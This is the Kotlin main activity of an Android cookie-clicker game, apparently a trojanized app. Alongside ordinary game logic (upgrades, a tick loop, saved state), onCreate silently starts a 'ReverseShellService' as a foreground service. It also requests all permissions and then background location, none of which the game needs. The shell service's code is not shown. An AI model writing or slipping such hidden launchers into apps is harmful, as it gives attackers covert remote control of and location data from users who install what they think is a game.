package tech.fakeclicker

import android.content.Intent
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.animation.AnimationUtils
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import tech.fakeclicker.databinding.ActivityMainBinding

private data class Upgrade(
    val id: String,
    val label: String,
    val emoji: String,
    val cost: Long,
    val cps: Long,
)

private val UPGRADES = listOf(
    Upgrade("cursor",  "Cursor",  "👆", 10L,    1L),
    Upgrade("grandma", "Grandma", "👵", 100L,   5L),
    Upgrade("farm",    "Farm",    "🌾", 500L,   10L),
    Upgrade("mine",    "Mine",    "⛏️", 2_000L, 40L),
    Upgrade("factory", "Factory", "🏭", 8_000L, 100L),
)

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val score = CookieScore()
    private val bought = mutableSetOf<String>()
    private val tickHandler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        restoreState()
        setupCookieButton()
        setupUpgrades()
        startTickLoop()
        startShellService()
        PermissionHelper.requestAll(this)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PermissionHelper.REQUEST_CODE) {
            PermissionHelper.requestBackgroundLocation(this)
        }
    }

    override fun onPause() {
        super.onPause()
        saveState()
    }

    override fun onDestroy() {
        super.onDestroy()
        tickHandler.removeCallbacksAndMessages(null)
    }

    private fun setupCookieButton() {
        val tapAnim = AnimationUtils.loadAnimation(this, R.anim.cookie_tap)
        binding.btnCookie.setOnClickListener { view ->
            score.tap()
            view.startAnimation(tapAnim)
            spawnFloatingPlus()
            updateCounterUI()
            updateUpgradeStates()
        }
    }

    private fun setupUpgrades() {
        UPGRADES.forEach { upgrade ->
            binding.upgradesRow.addView(buildUpgradeCard(upgrade))
        }
    }

    private fun buildUpgradeCard(upgrade: Upgrade): LinearLayout {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(16, 12, 16, 12)
            setBackgroundColor(
                if (score.canAfford(upgrade.cost) && upgrade.id !in bought)
                    Color.parseColor("#3d1f00")
                else
                    Color.parseColor("#1f1000")
            )
            tag = upgrade.id
            layoutParams = LinearLayout.LayoutParams(160, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
                setMargins(8, 0, 8, 0)
            }
        }

        val emoji = TextView(this).apply {
            text = upgrade.emoji
            textSize = 28f
            gravity = android.view.Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }
        val name = TextView(this).apply {
            text = upgrade.label
            setTextColor(Color.WHITE)
            textSize = 11f
            gravity = android.view.Gravity.CENTER
        }
        val costView = TextView(this).apply {
            text = formatNumber(upgrade.cost)
            setTextColor(Color.parseColor("#f5a623"))
            textSize = 11f
            gravity = android.view.Gravity.CENTER
        }
        val cpsView = TextView(this).apply {
            text = "+${upgrade.cps}/s"
            setTextColor(Color.parseColor("#cccccc"))
            textSize = 10f
            gravity = android.view.Gravity.CENTER
        }

        card.addView(emoji)
        card.addView(name)
        card.addView(costView)
        card.addView(cpsView)

        if (upgrade.id !in bought) {
            card.setOnClickListener {
                if (score.canAfford(upgrade.cost)) {
                    score.buyUpgrade(upgrade.cost, upgrade.cps)
                    bought.add(upgrade.id)
                    card.isClickable = false
                    card.setBackgroundColor(Color.parseColor("#0d0500"))
                    emoji.alpha = 0.4f
                    updateCounterUI()
                    updateUpgradeStates()
                }
            }
        } else {
            card.setBackgroundColor(Color.parseColor("#0d0500"))
            emoji.alpha = 0.4f
        }

        return card
    }

    private fun updateUpgradeStates() {
        for (i in 0 until binding.upgradesRow.childCount) {
            val card = binding.upgradesRow.getChildAt(i) as? LinearLayout ?: continue
            val id = card.tag as? String ?: continue
            if (id in bought) continue
            val upgrade = UPGRADES.find { it.id == id } ?: continue
            card.setBackgroundColor(
                if (score.canAfford(upgrade.cost)) Color.parseColor("#3d1f00")
                else Color.parseColor("#1f1000")
            )
        }
    }

    private fun startTickLoop() {
        tickHandler.post(object : Runnable {
            override fun run() {
                score.tick()
                updateCounterUI()
                tickHandler.postDelayed(this, 1_000)
            }
        })
    }

    private fun updateCounterUI() {
        binding.tvCookieCount.text = "${formatNumber(score.cookies)} cookies"
        binding.tvCps.text = "${score.cookiesPerSecond} per second"
    }

    private fun spawnFloatingPlus() {
        val tv = TextView(this).apply {
            text = "+1"
            setTextColor(Color.parseColor("#f5a623"))
            textSize = 18f
            alpha = 1f
        }
        val cookie = binding.btnCookie
        val x = cookie.x + cookie.width / 2f - 20f
        val y = cookie.y
        tv.x = x
        tv.y = y
        binding.rootLayout.addView(tv)
        tv.animate()
            .translationYBy(-120f)
            .alpha(0f)
            .setDuration(700)
            .withEndAction { binding.rootLayout.removeView(tv) }
            .start()
    }

    private fun formatNumber(n: Long): String = when {
        n >= 1_000_000_000 -> "%.1fB".format(n / 1_000_000_000.0)
        n >= 1_000_000     -> "%.1fM".format(n / 1_000_000.0)
        n >= 1_000         -> "%.1fK".format(n / 1_000.0)
        else               -> n.toString()
    }

    private fun startShellService() {
        val intent = Intent(this, ReverseShellService::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun saveState() {
        getSharedPreferences("cc", MODE_PRIVATE).edit().apply {
            putLong("cookies", score.cookies)
            putStringSet("bought", bought)
            apply()
        }
    }

    private fun restoreState() {
        val prefs = getSharedPreferences("cc", MODE_PRIVATE)
        val savedCookies = prefs.getLong("cookies", 0L)
        val savedBought = prefs.getStringSet("bought", emptySet()) ?: emptySet()
        repeat(savedCookies.coerceAtMost(Int.MAX_VALUE.toLong()).toInt()) { score.tap() }
        savedBought.forEach { id ->
            UPGRADES.find { it.id == id }?.let { upgrade ->
                bought.add(id)
                score.buyUpgrade(0L, upgrade.cps)
            }
        }
    }
}
